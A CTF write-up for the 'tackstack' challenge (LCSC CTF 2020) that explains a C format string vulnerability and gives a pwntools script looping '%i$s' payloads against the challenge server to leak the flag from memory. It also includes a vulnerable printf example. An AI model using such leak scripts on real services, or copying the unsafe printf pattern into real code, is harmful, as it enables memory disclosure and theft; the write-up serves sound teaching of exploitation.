---
layout: writeup
title:  "tackstack"
date:   2020-04-04 17:10:05 +0200
event: "LCSC CTF 2020"
categories: [writeup]
ctf_categories: [web, sql]
image: "img/chall.png"
author: "punshLineLama"
---
# tackstack

## TL;DR
 Exploit format string vuln, by dumping all strings from memory with the `%i$s`, for i in range(1,100).

## Description
The challenge was in the binary exploitation category, gave 100 points and had the following description:
```
Have you ever played Jenga? Tack Stack is like that game, but with tacks!

Connect with:
nc jh2i.com 50038
```

When connection to the server, there is a prompt, asking for data.
```
========================
|       TACKSTACK      |
========================


Welcome to TackStack!
How to play:
  * Stack your tacks!
Ready? Go!

Your tack:
```
When entering data, it was echoed back by the server. The first thing I checked, was if there is a format string vulnerability.

Thus I tested my hypothesis:
```
Your tack: %x%x
------------------------
|                      |
    4030bef273b780
|                      |
------------------------
```
We see that we get some values from the stack.

A format string vulnerability occurs in C, when the program prints a user-controlled buffer without the right formatting. E.g.:

```C

char str1[20];

printf("Gimme data: ");
scanf("%s", str1);

//Correct/safe way:
printf("%s\n", str1);

//False/vulnerable way:
printf(str1);

```

When there are format string parameters in the first argument of `printf` it pops arguments from the stack and displays them.


## Exploiting the Service

We can use this to dump all the strings from the program memory, starting from the stack by using the %s format string.

To print the i^th string on the stack, we can use the following format string: `%i$s`.
Now we just need to loop for n in [1..100] to and grep the flag.
Thus a little python script which does exactly this.


```python
from pwn import *

ret = ""
for i in range(1,100):
  #start remote connection
	p = remote("jh2i.com", 50038)
  #read from connection
	ret = p.recvuntil("tack: ")
  #send format string
	p.sendline("%"+str(i)+"$s")
  #check if crashed, and read the output
	try:
		ret = p.recvuntil("tack: ")
	except:
		print("crashed")
  # If we got the flag, print it and break the loop
	if("LLS{" in ret):
		print(ret)
		break
  #else close connection and restart the loop
	p.close()
```

Just wait a few iterations, and there we go, we get our flag:

```
Your tack:
------------------------
|                      |
    FLAG=LLS{tack_stack?_more_like_stack_attack}
|                      |
------------------------
```
